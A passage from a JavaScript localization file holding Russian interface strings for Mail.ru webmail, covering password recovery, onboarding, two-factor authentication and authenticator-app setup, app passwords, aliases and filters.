					"note": "Если вам приходили уведомления из соцсетей на этот адрес, авторизуйтесь, чтобы подтвердить права на ящик."
				},
				"settings_phones": {
					"label": "Номера телефонов, которые вы указывали в настройках",
					"note": "Перечислите номера телефонов через запятую"
				},
				"last_login_period": {
					"label": "Дата последнего входа в почту",
					"note": "Через сайт или почтовую программу"
				},
				"forward_email": {
					"label": "Адрес пересылки"
				},
				"filters": {
					"label": "Какие фильтры настроены в&nbsp;ящике"
				},
				"change_details_period": {
					"label": "Когда последний раз вы меняли данные?"
				},
				"software": {
					"label": "Почтовая программа"
				},
				"device": {
					"label": "Устройство"
				},
				"device_last_login_period": {
					"label": "Дата последнего входа"
				},
				"agent": {
					"label": "Mail.ru Агент"
				},
				"my_mail": {
					"label": "Мой Мир"
				},
				"capcha": {
					"label": "Код с картинки",
					"error": {
						"invalid": "Неправильно введен код"
					}
				},
				"id": {
					"error": {
						"not_exists": "Во время восстановления доступа к ящику произошла ошибка. Пожалуйста, повторите попытку заново.",
						"required": "Во время восстановления доступа к ящику произошла ошибка. Пожалуйста, повторите попытку заново.",
						"invalid": "Во время восстановления доступа к ящику произошла ошибка. Пожалуйста, повторите попытку заново."
					}
				},
				"other": {
					"label": "Другая информация"
				},
				"birthday": {
					"label": "Дата рождения"
				},
				"secret": {
					"label": "Секретный вопрос"
				},
				"_select": {
					'options': {
						"lt_1w": "Менее недели назад",
						"lt_1m": "Менее месяца назад",
						"lt_3m": "Менее 3 месяцев назад",
						"lt_6m": "Менее 6 месяцев назад",
						"gt_6m": "Более 6 месяцев назад",
						"lt_1y": "Менее 1 года назад",
						"lt_3y": "Менее 3 лет назад",
						"gt_3y": "Более 3 лет назад",
						"use": "Использую",
						"not_use": "Не использую",
						"dont_remember": "Не помню",
						"today": "Cегодня",
						"yesterday": "Вчера",
						"dont_know": "Не знаю",
						"day": "день",
						"month": "месяц",
						"year": "год",
						"choose": "Выберите"
					}
				}
			},
			"control": {
				"submit": "Отправить",
				"back": "Назад",
				"change": "изменить",
				"specify": "указать адрес",
				"addpass": "Указать еще пароль"
			},
			"error": {
				"field": {
					"invalid": "Поле заполнено некорректно",
					"required": "Поле обязательно для заполнения",
					"not_exists": "Почтовый ящик не указан, либо указан неверно",
					"not_available": "Востановление пароля через службу поддержки недоступно для этого ящика",
					"admin_disabled": "Возможность восстановления пароля для указанного ящика заблокирована администратором",
					"required_any": "Заполните хотя бы одно поле",
					"same_password": 'Вы указали действующий пароль от почтового ящика в поле «Пароль при регистрации». Пожалуйста, используйте его для <a href=\"%s\">входа в ящик</a>.',
					"unknown": "Возникла непредвиденная ошибка, повторите запрос позднее"
				}
			}
		}
	}});

	Lang.add({'RU': {
		"initial-tuning-tutorial": {
			  closeTutorial: 'Закрыть'
			, elseDomain: ['Другое', 'Другая почта']
			, headText: {
				  greeting: ['Добро пожаловать в Почту Mail.Ru!', 'Настройте сбор почты из других ящиков']
				, photoSign: 'Загрузка фотографии и создание подписи'
				, welcome: 'Ура! Представляем вам новую Почту!'
				, themeChoosing: ['Выберите тему, которая вам по душе', 'Добро пожаловать! Выберите тему оформления', 'Почта обновлена! Выберите тему, которая вам по душе']
				, collectMail: 'Сбор почты'
				, collectMailFrom: 'Сбор почты из'
				, successCollectorCreate: 'Сборщик добавлен успешно'
				, app: 'Установите наше мобильное приложение'
				, share: 'Расскажите о почте друзьям'
			}
			, centralBoxText: {
				  collector: ['У вас есть почтовый ящик на одном из этих сервисов?', 'Тогда рекомендуем вам собрать все письма из него в почтовый ящик <br /><strong></strong>', 'Введите «Имя ящика» и «Пароль» от почты, с которой вы хотите забирать письма:']
				, collectorSuccessAdd: ['Отлично! Сейчас мы скопируем ваши письма из ящика', 'Это может занять несколько часов.']
				, welcome: ['Мы обновили интерфейс, оставив на своих местах все привычные элементы.<br/>Почта стала быстрее, красивее, удобнее и современнее.', 'Красивый и удобный<br/>интерфейс', 'Увеличена<br/>скорость', 'Повышена надёжность<br/>и безопасность']
				, photoSignUnderTextInput: 'Ваша подпись под каждым отправленным письмом'
				, photoSignBestRegards: 'С уважением'
				, userSignsLoading: 'Загрузка подписи...'
				, app: ['Узнавай мгновенно о новых письмах', 'Настрой время, папки и сайты для уведомлений', 'Читай письма без подключения к интернету', 'Получить ссылку на приложение по SMS']
			}
			, buttons: {
				  continueBtn: 'Продолжить'
				, skip: 'Пропустить'
				, done: 'Закончить'
				, save: 'Сохранить'
				, connect: 'Подключить'
				, uploadPhoto: 'Загрузить фото'
				, makePhoto: 'Сделать снимок'
				, send: 'Отправить письмо'
				, cancel: 'Отменить'
			}
			, labels: {
				  login: 'Имя ящика'
				, password: 'Пароль'
			}
			, placeholders: {
					name: ['Имя', 'Фамилия']
			}
			, signErrors : {
				  save:  'Не удалось сохранить подпись. Вы сможете сделать это самостоятельно в настройках.'
				, loading:  'Не удалось загрузить подпись.'
			}
			, formValidate: {
				  empty: 'Для сохранения подписи необходимо заполнить обязательные поля «Имя» и «Фамилия».'
				, incorrectSymbols: 'Поле не должно содержать двоеточия (\":\"), кавычек (\"), угловых скобок (<>) и знака (&).'
				, tooBigSign: 'Подпись может содержать максимум 255 символов, включая знаки препинания и пробелы.'
				, tooBigName: 'Поле должно иметь длину от 1 до 40 символов'
			}
			, sendSMSNotify: {
				  success: 'SMS отправлено'
				, error: {
					  common: 'Ошибка! Попробуйте еще раз'
					, bf: 'Превышен лимит отправленных SMS'
				}
			}
		},

		"initial-tuning-widget" : {
			title: 'Ваш ящик почти идеален! Но можно сделать еще лучше:',
			progress: 'Ваш путь к идеалу',
			close: 'Закрыть',
			items: {
				welcome: 'Завести новую почту',
				collector: 'Подключить старую почту',
				signature: 'Добавить фото и подпись',
				themes: 'Выбрать тему оформления',
				app: 'Установить приложение',
				share: 'Рассказать о почте друзьям'
			},
			comments: {
				0: 'Ваш ящик может быть лучше',
				30: 'Ваш ящик почти идеален',
				75: 'Осталось еще немного',
				100: 'Ваш ящик идеален!'
			}
		}
	}
	});

	Lang.add({'RU': {
		'edit-avatar': {
			uploadErrors: {
				  invalid_format: 'Данный формат файлов не поддерживается.'
				, camera_error: 'Не удалось сделать снимок.'
				, upload_error: 'Не удалось загрузить файл.'
				, error: 'Не удалось загрузить файл.'
			}
		}
	}});

	Lang.add({'RU': {
		'balloon.lettersMoveFilter.message': 	'Перемещать все новые письма от&nbsp;<b>%s</b> в данную папку?',
		'balloon.lettersMoveFilter.messageLong': 	'Перемещать все новые письма от&nbsp;<span class=\'balloon__message__interactive\' title=\'%s\'>%s&nbsp;отправителей</span> в данную папку?',
		'balloon.lettersMoveFilter.checkbox':	'Переместить все старые письма',
		'balloon.lettersMoveFilter.button':		'Перемещать автоматически',
		'balloon.lettersMoveFilter.settings':	'Настройки',
		'balloon.lettersMoveFilter.ok':			'Фильтр добавлен'
	}});

	Lang.add({'RU': {
		'balloon.threads-promo.title': 'Группировка писем',
		'balloon.threads-promo.text': 'Включите группировку писем,<br/>  или <a href=\"#\" class=\"pseudo-link\">узнайте больше</a> об&nbsp;этой&nbsp;возможности',
		'balloon.threads-promo.enable': 'Включить группировку',
		'balloon.threads-switcher.here': 'Переключать режим группировок тут'
	}});

	Lang.add({'RU': {
		'attachment-browser': {
			preview: 'Посмотреть',
			download: 'Скачать',
			expand: 'Показать файлы',
			collapse: 'Скрыть файлы',
			loading: 'Обработка',
			empty: 'Нет файлов',
			error: 'Не удалось открыть архив'
		}
	}});

	Lang.add({'RU': {
		'mailApp-promo-banner': {
			  content:  ['Проверяйте почту и отвечайте на письма, находясь вдали от компьютера', 'Введите свой номер телефона, и мы пришлем вам ссылку на установку Мобильной Почты Mail.Ru']
			, button:   ['Получить SMS']
			, messages: {
				  'sent': 'SMS отправлено. Откройте сообщение на своем телефоне и перейдите по ссылке.'
				, 'error.common': 'Сообщение не удалось отправить. Проверьте, правильно ли введен номер телефона, или повторите попытку позднее.'
				, 'error.bf': 'Вам уже было отправлено SMS.'
			}
		}
	}});

	Lang.add({'RU': {
		user: {
			'2-step-auth': {

				disable: {
					title: 'Вы действительно хотите отключить двухфакторную аутентификацию?',
					desc: 'Двухфакторная аутентификация обеспечивает дополнительный уровень защиты вашего аккаунта.',
					controls: {
						reset: 'Отменить',
						add: 'Продолжить'
					},
					errors: {
						reg_token_too_many:  'Превышено количество попыток. Пожалуйста, попробуйте через несколько минут.',
						unacceptable: 'Двухфакторная аутентификация уже выключена'
					},

					confirm: {
						title: 'Отключение двухфакторной аутентификации',
						desc: 'Для отключения двухфакторной аутентификации введите <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код, отправленный в SMS на номер</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',

						controls: {
							reset: 'Отменить',
							add: 'Отключить',
							code: 'Код из SMS',
							totp: 'Код из приложения',
							password: 'Пароль',
							resend: 'Не пришло SMS-сообщение?'
						},
						errors: {
							password_invalid:  'Введен неверный пароль',
							password_required:  'Введите пароль',
							reg_token_invalid:  'Введен неверный код',
							reg_token_required:  'Введите код, отправленный в SMS',
							totp_invalid:  'Введен неверный код из приложения',
							totp_required:  'Введите код из приложения',
							unacceptable: 'Двухфакторная аутентификация уже выключена'
						}
					}

				},

				enable: {
					title: 'Вы действительно хотите включить двухфакторную аутентификацию?',
					desc: 'Двухфакторная аутентификация обеспечивает дополнительный уровень защиты вашего аккаунта. После того как аутентификация будет включена, при попытке входа в почтовый ящик вам потребуется ввести код, отправленный в виде SMS на подключенный номер телефона.',
					disclamer: 'Двухфакторная аутентификация может быть включена только на телефоны, доступные для восстановления пароля.<br/> <a href=\"https://e.mail.ru/settings/userinfo#phonesAnchor\">Редактировать список телефонов</a>',
					controls: {
						reset: 'Отменить',
						add: 'Продолжить',
						phones: 'Выберите телефон',
						password: 'Пароль от аккаунта'
					},
					errors: {
						password_required:  'Введите пароль',
						password_invalid:  'Введен неверный пароль'
					},
					completed: {
						title: 'Двухфакторная аутентификация включена',
						controls: {
							reset: 'Закрыть',
							settings: 'Настроить двухфакторную аутентификацию'
						},

						errors: {
							reg_token_invalid: 'Произошла ошибка при создании операции, повторите снова'
						},

						informers: [
							{
								header: 'Распечатайте таблицу одноразовых кодов',
								text: 'Рекомендуем распечатать таблицу одноразовых кодов для входа в почтовый ящик, чтобы иметь возможность использовать его даже при потере доступа к телефону.',
								type: 'secstep-disposable-codes'
							},
							{
								header: 'Добавьте пароли для каждого из приложений',
								text: 'Обратите внимание, что все внешние приложения, в которых вы использовали данный почтовый ящик, перестали работать. Чтобы вновь начать их использовать, перейдите в настройки и создайте пароли для каждого.',
								type: 'secstep-passwords'
							}
						]

					},

					confirm: {
						title: 'Введите текущий пароль',
						desc: 'Для того чтобы продолжить, вам необходимо ввести пароль от почтового ящика.',
						controls: {
							reset: 'Отменить',
							add: 'Принять',
							password: 'Пароль'
						},
						errors: {
							password_required:  'Введите пароль',
							password_invalid:  'Введен неверный пароль'
						}
					}

				},

				change: {
					title: 'Выбор телефона',
					desc: 'Выберите номер телефона, на который будет отправляться SMS-сообщение с кодом для входа в ящик',

					title_to_totp: 'Отключение мобильного телефона',
					desc_to_totp: 'При отключении мобильного телефона как способа получения кодов подтверждения вы сможете воспользоваться только приложением.app_name.. Пожалуйста, убедитесь, что вы обладаете доступом к этому приложению.',

					title_to_sms: 'Подключение телефона',
					desc_to_sms: 'Выберите номер телефона, который будет использоваться для получения SMS-сообщений с кодом подтверждения. Этот способ будет использован как дополнительный к генерации кода мобильным приложением.app_name. при отсутствии доступа к мобильному устройству.',


					no_phone: 'У вас нет других подтвержденных телефонов.',
					controls: {
						reset: 'Отменить',
						add: 'Продолжить',
						add_to_sms: 'Подключить',
						add_to_totp:  'Отключить',
						phones: 'Выберите телефон',
						add_phone: 	'Добавить новый номер'
					},

					errors : {
						reg_token_too_many:  'Превышено количество попыток. Пожалуйста, попробуйте через несколько минут.',
						unacceptable: 'Невозможно изменить номер телефона'
					},

					confirm: {
						title: 'Изменение телефона для двухфакторной аутентификации',
						desc: 'Подтвердите изменение телефона, введите <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код, отправленный в SMS на номер</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',

						title_to_totp: 'Отключение мобильного телефона',
						desc_to_totp: ' Подтвердите отключение телефона вводом <span class=\"pwd\">текущего пароля <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">кодом, отправленным в SMS на номер</span> <span class=\"totp\">кодом, сгенерированным мобильным приложением</span>',

						title_to_sms: 'Подключение телефона',
						desc_to_sms: ' Подтвердите выбор телефона вводом <span class=\"pwd\">текущего пароля <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">кодом, отправленным в SMS на номер</span> <span class=\"totp\">кодом, сгенерированным мобильным приложением</span>',

						controls: {
							reset: 'Отменить',
							add: 'Изменить',
							add_to_sms: 'Подключить',
							add_to_totp:  'Отключить',
							code: 'Код из SMS',
							totp: 'Код из приложения',
							password: 'Пароль',
							resend: 'Не пришло SMS-сообщение?'
						},
						errors: {
							password_invalid:  'Введен неверный пароль',
							password_required:  'Введите пароль',
							reg_token_invalid:  'Введен неверный код',
							reg_token_required:  'Введите код, отправленный в SMS',
							totp_invalid:  'Введен неверный код из приложения',
							totp_required:  'Введите код из приложения',
							unacceptable: 'Невозможно изменить номер телефона'
						}
					}
				},

				'trusted-devices': {
					reset: {
						title: 'Вы уверены, что хотите сбросить доверия для всех устройств?',
						controls: {
							reset: 'Отменить',
							add: 'Сбросить'
						},
						errors: {
								reg_token_too_many:  'Превышено количество попыток. Пожалуйста, попробуйте через несколько минут.'
						},

						confirm: {
							title: 'Введите текущий пароль и код из SMS',
							desc: ' Для сброса доверия ко всем устройствам, введите <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код, отправленный в SMS на номер</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',
							controls: {
								reset: 'Отменить',
								add: 'Принять',
								totp: 'Код из приложения',
								code: 'Код из SMS',
								password: 'Пароль',
								resend: 'Не пришло SMS-сообщение?'
							},
							errors: {
								password_required:  'Введите пароль',
								password_invalid:  'Введен неверный пароль',
								reg_token_invalid:  'Введен неверный код',
								reg_token_required:  'Введите код, отправленный в SMS',
								totp_invalid:  'Введен неверный код из приложения',
								totp_required:  'Введите код из приложения'
							}
						},

						completed: {
							title: 'Доверия ко всем устройствам сброшено',
							desc: 'Доверия для всех устройств были сброшены. Каждый вход в почтовый ящик будет сопровождаться требованием ввода кода из SMS-сообщения.',
							controls: {
								reset: 'Закрыть'
							},
							errors: {
								reg_token_invalid: 'Произошла ошибка при создании операции, повторите снова.'
							}
						}

					}
				},

                passwords: {

                    add: {
                        title: 'Создание нового приложения',
                        desc: 'Пароль для приложения необходим для работы почты в сторонних приложениях',
                        controls: {
                            reset: 'Отменить',
                            add: 'Создать',
                            name: 'Название'
                        },

                        errors: {
                            name_invalid:  'Введено неверное имя приложения',
                            name_required:  'Введите имя приложения',
                            reg_token_invalid: 'Произошла ошибка при выполнении операции. Пожалуйста, повторите попытку снова',
                            unacceptable: 'Двухфакторная аутентификация уже выключена'
                        },

                        completed: {
                            title: 'Приложение .application. успешно создано!',
                            desc: 'Этот пароль может быть использован для работы с почтой в сторонних приложениях',
                            controls: {
                                reset: 'Закрыть'
                            }
                        },

                        confirm: {
                            title: 'Введите текущий пароль',
                            desc: 'Для того чтобы продолжить, вам необходимо ввести пароль от почтового ящика.',
                            controls: {
                                reset: 'Отменить',
                                add: 'Принять',
                                password: 'Пароль'
                            },
                            errors: {
                                password_required:  'Введите пароль',
                                password_invalid:  'Введен неверный пароль'
                            }
                        }

                    },

                    remove: {
                        title: 'Вы действительно хотите удалить приложение?',
                        desc: 'Обратите внимание, все приложения, использующие этот пароль, перестанут работать',
                        controls: {
                            reset: 'Отменить',
                            add: 'Удалить'
                        },
                        errors: {
                            id_not_exists: 'Произошла ошибка, пожалуйста, <a onClick=\"location.reload()\" style=\"cursor: pointer;\">обновите страницу</a>',
                            unacceptable: 'Двухфакторная аутентификация уже выключена'
                        }
                    },

                    generate: {
                        title: 'Создание нового пароля для приложения .application.',
                        desc: 'Обратите внимание, после создания нового пароля старый перестанет работать.',
                        footer: 'Вы уверены, что хотите создать новый пароль?',
                        controls: {
                            reset: 'Отменить',
                            add: 'Продолжить'
                        },

                        errors: {
                            reg_token_invalid: 'Произошла ошибка, пожалуйста, <a onClick=\"location.reload()\" style=\"cursor: pointer;\">обновите страницу</a>',
                            id_not_exists: 'Произошла ошибка, пожалуйста, <a onClick=\"location.reload()\" style=\"cursor: pointer;\">обновите страницу</a>',
                            unacceptable: 'Двухфакторная аутентификация уже выключена'
                        },

                        completed: {
                            title: 'Создан новый пароль для приложения .application.',
                            desc: 'Этот пароль может быть использован для входа в почту через сторонние приложения',
                            controls: {
                                reset: 'Закрыть'
                            }
                        },

                        confirm: {
                            title: 'Введите текущий пароль',
                            desc: 'Для того чтобы продолжить, вам необходимо ввести пароль от почтового ящика.',
                            controls: {
                                reset: 'Отменить',
                                add: 'Принять',
                                password: 'Пароль'
                            },
                            errors: {
                                password_required:  'Введите пароль',
                                password_invalid:  'Введен неверный пароль',
                                id_not_exists: 'Произошла ошибка, пожалуйста, <a onClick=\"location.reload()\" style=\"cursor: pointer;\">обновите страницу</a>'
                            }
                        },

                        disposable: {
                            title: 'Вы действительно хотите сгенерировать новую таблицу кодов?',
                            desc: 'Обратите внимание, ваши старые коды перестанут быть действительными',
                            controls: {
                                reset: 'Отменить',
                                add: 'Продолжить'
                            },

                            completed: {
                                title: 'Одноразовые коды',
                                controls: {
                                    reset: 'Готово',
                                    print: 'Напечатать'
                                }
                            },

                            errors: {
                                reg_token_too_many:  'Превышено количество попыток. Пожалуйста, попробуйте через несколько минут.',
                                unacceptable: 'Двухфакторная аутентификация уже выключена'
                            },

                            confirm: {
                                title: 'Введите <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код из SMS</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',
                                desc: 'Для генерации таблицы кодов введите <span class=\"pwd\">текущий пароль  <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код, отправленный в SMS на номер</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',
                                controls: {
                                    reset: 'Отменить',
                                    add: 'Принять',
									totp: 'Код из приложения',
                                    code: 'Код из SMS',
                                    password: 'Пароль',
                                    resend: 'Не пришло SMS-сообщение?'
                                },
                                errors: {
                                    password_required:  'Введите пароль',
                                    password_invalid:  'Введен неверный пароль',
                                    reg_token_invalid:  'Введен неверный код',
                                    reg_token_required:  'Введите код, отправленный в SMS',
									totp_invalid:  'Введен неверный код из приложения',
									totp_required:  'Введите код из приложения'
                                }
                            }

                        }
                    }

                },

				totp: {

					secret: {

						generate: {
							title: 'Подключение мобильного приложения',
							desc: 'При отсутствии доступа к подключенному мобильному телефону вы можете использовать мобильное приложение для генерации кода подтверждения.',
							controls: {
								reset: 'Отменить',
								add: 'Продолжить',
								filters:  'Выберите платформу вашего телефона:',
								options:  'Выберите приложение:'
							},

							errors: {
								reg_token_too_many:  'Превышено количество попыток. Пожалуйста, попробуйте через несколько минут.',
								unacceptable: 'Двухфакторная аутентификация уже выключена'
							},

							confirm: {
								title: 'Введите <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код из SMS</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',
								desc: 'Для того чтобы продолжить, вам необходимо ввести <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код, отправленный в SMS на номер</span> <span class=\"totp\">код, сгенерированный мобильным приложением</span>',
								controls: {
										reset: 'Отменить',
										add: 'Принять',
										code: 'Код из SMS',
										password: 'Пароль',
										totp: 'Код из приложения',
										resend: 'Не пришло SMS-сообщение?'
								},
								errors: {
									password_required:  'Введите пароль',
									password_invalid:  'Введен неверный пароль',
									reg_token_invalid:  'Введен неверный код',
									reg_token_required:  'Введите код, отправленный в SMS',
									totp_invalid:  'Введен неверный код из приложения',
									totp_required:  'Введите код из приложения'
								}
							}

						}

					},

					enable: {
						title: 'Подключение мобильного приложения',

						controls: {
							reset: 'Отменить',
							add: 'Закончить настройку'
						},

						steps: {

							'Google Authenticator.ios': {
								'first': 'Скачайте приложение <a href=\"https://itunes.apple.com/ru/app/google-authenticator/id388497605?mt=8\" target=\"_blank\">Google Authenticator в App Store</a> или <a data-name=\"back\" class=\"js-back pseudo-link\">выберите другое приложение</a>',
								'second':  'Нажмите \"Приступить к настройке\" или значок \"+\".<br/>Выберите \"Сканировать штрихкод\". Отсканируйте QR-код<br/> <a class=\"js-toggle pseudo-link\">Не могу отсканировать код</a>',
								'third': 'Введите шестизначный код, <br/> сгенерированный приложением'
							},

							'Google Authenticator.android': {
								'first': 'Скачайте приложение <a href=\"https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2\" target=\"_blank\">Google Authenticator в Google Play</a> или <a data-name=\"back\" class=\"js-back pseudo-link\">выберите другое приложение</a>',
								'second':  'Нажмите \"Приступить к настройке\" или на кнопку в правом верхнем углу.<br/>Выберите \"Сканировать штрихкод\". Отсканируйте QR-код<br/> <a class=\"js-toggle pseudo-link\">Не могу отсканировать код</a>',
								'third': 'Введите шестизначный код, <br/> сгенерированный приложением'
							},

							'FreeOTP.ios': {
								'first': 'Скачайте приложение <a href=\"https://itunes.apple.com/en/app/freeotp-authenticator/id872559395?mt=8\" target=\"_blank\">FreeOTP в App Store</a> или <a data-name=\"back\" class=\"js-back pseudo-link\">выберите другое приложение</a>',
								'second':  'Нажмите на значок QR-кода слева от<br/> значка \"+\". Отсканируйте QR-код<br/> <a class=\"js-toggle pseudo-link\">Не могу отсканировать код</a>',
								'third': 'Введите шестизначный код, <br/> сгенерированный приложением'
							},

							'FreeOTP.android': {
								'first': 'Скачайте приложение <a href=\"https://play.google.com/store/apps/details?id=org.fedorahosted.freeotp\" target=\"_blank\">FreeOTP в Google Play</a> или <a data-name=\"back\" class=\"js-back pseudo-link\">выберите другое приложение</a>',
								'second':  'Нажмите на значок QR-кода слева от значка \"+\".<br/> Отсканируйте QR-код<br/> <a class=\"js-toggle pseudo-link\">Не могу отсканировать код</a>',
								'third': 'Введите шестизначный код, <br/> сгенерированный приложением'
							},

							'Authenticator.wp': {
								'first': 'Скачайте приложение <a href=\"http://www.windowsphone.com/ru-ru/store/app/authenticator/e7994dbc-2336-4950-91ba-ca22d653759b\" target=\"_blank\">Authenticator в Windows Phone Apps</a> или <a data-name=\"back\" class=\"js-back pseudo-link\">выберите другое приложение</a>',
								'second':  'Нажмите на значок \"+\", затем на значок камеры.<br/> Отсканируйте QR-код<br/> <a class=\"js-toggle pseudo-link\">Не могу отсканировать код</a>',
								'third': 'Введите шестизначный код, <br/> сгенерированный приложением'
							},

							'other': {
								'first': 'Откройте приложение для генерации кодов. Вы так же можете <a data-name=\"back\" class=\"js-back pseudo-link\">выбрать другое приложение</a>',
								'second':  'Отсканируйте QR-код<br/> <a class=\"js-toggle pseudo-link\">Не могу отсканировать код</a>',
								'third': 'Введите шестизначный код, <br/> сгенерированный приложением'
							}

						},


						helps: {

							'Google Authenticator.ios':
							[
								'Выберите \"Ввод вручную\"',
								' Введите имя ящика в поле \"Аккаунт\"',
								'Введите ключ:<br/ >  <div class=\"b-settings-totp-help__secret\">.secret. </div>',
								' Проверьте, что выбрано значение \"По времени\"',
								'Нажмите на галочку подтверждения'
							],

							'Google Authenticator.android':
							[
								'Выберите \"Введите ключ\"',
								' Введите имя ящика',
								'Введите ключ:<br/ >  <div class=\"b-settings-totp-help__secret\">.secret. </div>',
								' Проверьте, что выбрано значение \"По времени\"',
								'Нажмите на галочку подтверждения'
							],

							'FreeOTP.ios':
							[
								'Нажмите на значок \"+\"',
								'Выберите пункт \"Time-based (TOTP)\"',
								' Введите \"Mail.Ru\" в пункт \"Issuer\" и имя ящика в пункт ID',
								'Введите ключ в поле Secret:<br/ >  <div class=\"b-settings-totp-help__secret\">.secret. </div>',
								' Проверьте, что выбрано значение \"SHA1\"',
								'Нажмите на \"Save\"'
							],

							'FreeOTP.android':
							[
								'Нажмите на значок \"+\"',
								' Введите имя ящика в первое поле и Mail.Ru во второе',
								'Введите ключ в поле Secret:<br/ >  <div class=\"b-settings-totp-help__secret\">.secret. </div>',
								' Проверьте, что выбрано значение \"SHA1\", тип - TOTP и Digits - 6',
								'Нажмите на \"Add”'
							],

							'Authenticator.wp':
							[
								'Нажмите на значок \"+\"',
								' Введите имя ящика в первое поле',
								'Введите ключ в поле Secret:<br/ >  <div class=\"b-settings-totp-help__secret\">.secret. </div>',
								'Нажмите на галочку подтверждения'
							],

							'other':
							[
								'Выберите ручную настройку',

								'Введите ключ:<br/ >  <div class=\"b-settings-totp-help__secret\">.secret. </div>'

							]
						},

						errors: {
							code_required:  'Введите код',
							code_invalid: 'Введен неверный код. Пожалуйста, проверьте точность установленного времени на вашем устройстве.',
							code_limit_too_many: 'Вы превысили лимит на попытки проверки кода. Пожалуйста, пройдите процесс подключения заново.'
						}

					},

					disable: {
						title: 'Вы действительно хотите отключить приложение для генерации кода?',
						desc: 'После отключения приложения для генерации кода подтверждения вы больше не сможете использовать его для входа в аккаунт.',

						controls: {
							reset: 'Отменить',
							add: 'Продолжить'
						},
						errors: {
							reg_token_too_many:  'Превышено количество попыток. Пожалуйста, попробуйте через несколько минут.',
							unacceptable: 'Приложение для генерации кодов уже выключено'
						},

						confirm: {
							title: 'Отключение приложения для генерации кода подтверждения',
							desc: 'Для отключения приложения для генерации кода подтверждения введите <span class=\"pwd\">текущий пароль <span class=\"pwd-and-sms\">и</span> </span> <span class=\"sms\">код, отправленный в SMS на номер</span>',
							controls: {
								reset: 'Отменить',
								add: 'Отключить',
								code: 'Код из SMS',
								totp: 'Код из приложения',
								password: 'Пароль',
								resend: 'Не пришло SMS-сообщение?'
							},
							errors: {
								password_invalid:  'Введен неверный пароль',
								password_required:  'Введите пароль',
								reg_token_invalid:  'Введен неверный код',
								reg_token_required:  'Введите код, отправленный в SMS',
								unacceptable: 'Двухфакторная аутентификация уже выключена',
								totp_invalid:  'Введен неверный код из приложения',
								totp_required:  'Введите код из приложения'
							}
						}

					},

				}

            }
        },

		'not-responded': {
			title: 'Проблема при выполнении операции',
			desc: 'Произошла неизвестная ошибка, либо возникли проблемы с Интернет-соединением. Пожалуйста, перезагрузите страницу, чтобы продолжить работу с сервисом.',
			controls: {
				reload_page: 'Перезагрузить'
			}
		},

        tokens: {

            send: {

                waiting: {
                    title: 'Не пришло SMS-сообщение ?',
                    desc: 'С момента отправки прошло менее <b>5 минут.</b> Скорее всего SMS-сообщение придет в ближайшие несколько минут.',
                    footer: 'Сообщение было отправлено на номер',
                    controls: {
                        send: 'Повторить отправку'
                    }
                },

                release: {
                    title: 'Не пришло SMS-сообщение ?',
                    desc: 'Если сообщение до сих пор не пришло, Вы можете запросить повторную отправку',
                    footer: 'Возможно, вы случайно ввели не тот номер ?',
                    controls: {
                        send: 'Повторить отправку'
                    }
                },

                controls: {
                    back: 'Вернуться'
                }

            },

            generate: {
                title: 'Введите текущий пароль',
                desc: 'Для того чтобы продолжить, вам необходимо ввести пароль от почтового ящика.',
                controls: {
                    reset: 'Отменить',
                    add: 'Принять',
                    password: 'Пароль'
                },
                errors: {
                    password_required:  'Введите пароль',
                    password_invalid:  'Введен не корректный пароль'
                }
            }

        },

        aliases: {

            add: {
                title: 'Создание временного адреса',
                controls: {
                    folder:  'Отправлять письма в папку',
                    address: 'Адрес',
                    comment: 'Комментарий',
                    reset: 'Отменить',
                    add: 'Создать'
                },

                folders: {
                    main:   'Имя алиаса',
                    top: 'с именем временного адреса'
                },


                errors: {
                    username_required:  'Введите адрес',
                    username_occupied:  'Данный адрес занят',
                    username_invalid:  'Введен некорректный адрес временного ящика',
                    captcha_required: 'Введите код с картинки',
                    captcha_invalid: 'Вы ввели некорректный текст с картинки',
                    limit_exceeded: 'Превышен лимит временных адресов',
					folders_not_actual: 'Произошла ошибка, пожалуйста, <a onClick=\"location.reload()\" style=\"cursor: pointer;\">обновите страницу</a>',
					comment_invalid: 'Вы ввели слишком большой комментарий'
				},

				confirm: {
					title: 'Введите текст с картинки',
					desc: 'Для того чтобы продолжить, вам необходимо ввести пароль от почтового ящика.',
					controls: {
						reset: 'Отменить',
						add: 'Принять'
					},
					errors: {
						capcha_required:  'Введите текст',
						capcha_invalid:  'Введен не верный текст'
					}
				}
			},

			remove: {
				title: 'Вы действительно хотите удалить временный адрес?',
				desc: 'Все письма, которые отправляются на этот временный адрес, перестанут приходить в ваш ящик.',
				controls: {
					reset: 'Отменить',
					add: 'Удалить'
				},
				errors: {
					id_not_exists: 'Произошла ошибка, пожалуйста, <a onClick=\"location.reload()\" style=\"cursor: pointer;\">обновите страницу</a>',
					unacceptable: 'Двухфакторная аутенфикация уже выключена'
				}
			}

		},

		application: {

			controls: {
				generate: 'Сгенерировать пароль',
				remove: 'Удалить'
			}

		},

		alias: {

			controls: {
				remove: 'Удалить',
				copy:  'Копировать в буффер'
			}

		},

		messages: {
			compose: {
				desc: 'отправка письма'
			}
		},

		filters: {
			add : {
				confirm: {
					title: 'Введите текущий пароль',
					desc: 'Для подтверждения настройки пересылки введите пароль от текущего ящика<span class=popup__desc_phone> и код, отправленный в SMS на номер</span>',
					controls: {
						reset: 'Отменить',
						add: 'Принять',
						code: 'Код из SMS',
						password: 'Пароль',
						resend: 'Не пришло SMS-сообщение?'
					},
					errors: {
						password_required:  'Введите пароль',
						password_invalid:  'Введен неверный пароль',
						reg_token_invalid:  'Введен неверный код',
